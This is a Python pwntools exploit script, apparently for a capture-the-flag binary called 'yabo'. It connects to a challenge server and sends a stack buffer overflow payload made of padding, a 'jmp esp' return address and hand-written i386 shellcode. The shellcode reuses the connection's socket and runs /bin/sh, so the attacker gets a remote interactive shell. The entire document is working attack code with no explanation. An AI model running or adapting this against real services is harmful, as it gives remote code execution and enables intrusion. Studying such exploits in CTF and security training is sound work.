#!/usr/bin/env python3

from pwn import *
from binascii import hexlify

binary = context.binary = ELF('./yabo')

if args.REMOTE:
	p = remote('challenge.ctf.games', 32332)
else:
	p = remote('127.0.0.1', 9999)

arg0 = b'/bin/sh'

# props: http://shell-storm.org/shellcode/files/shellcode-881.php
shellcode = asm(f'''
/* dup(2) to get next fd, then dec for current */

push 2
pop ebx
push {constants.SYS_dup}
pop eax
int 0x80
dec eax													# should be current fd
mov ebx, eax											# put in ebx for dup2

/* dup2(fd,0); dup2(fd,1); dup2(fd,2); */

xor ecx, ecx
push {constants.SYS_dup2}
pop eax
int 0x80
inc ecx
push {constants.SYS_dup2}
pop eax
int 0x80
inc ecx
push {constants.SYS_dup2}
pop eax
int 0x80

/* shell */

mov ebx, {'-0x' + hexlify(arg0[4:][::-1]).decode()}		# because of nulls set a neg, then use neg, then push to stack
neg ebx
push ebx
push {'0x' + hexlify(arg0[0:4][::-1]).decode()} 		# rest of path
mov ebx, esp
xor ecx, ecx											# ecx = 0
xor edx, edx											# edx = 0
push {constants.SYS_execve}
pop eax
int 0x80
''')

log.info('len(shellcode): ' + str(len(shellcode)))

jmp_esp = next(binary.search(asm('jmp esp')))

payload  = b''
payload += 0x414 * b'A'
payload += p32(jmp_esp)
payload += shellcode

if payload.find(b'\0') != -1:
	log.critical('NULL in payload, exiting!')
	print(disasm(shellcode))
	sys.exit(1)

p.sendlineafter(b'say?: ',payload)
p.interactive()

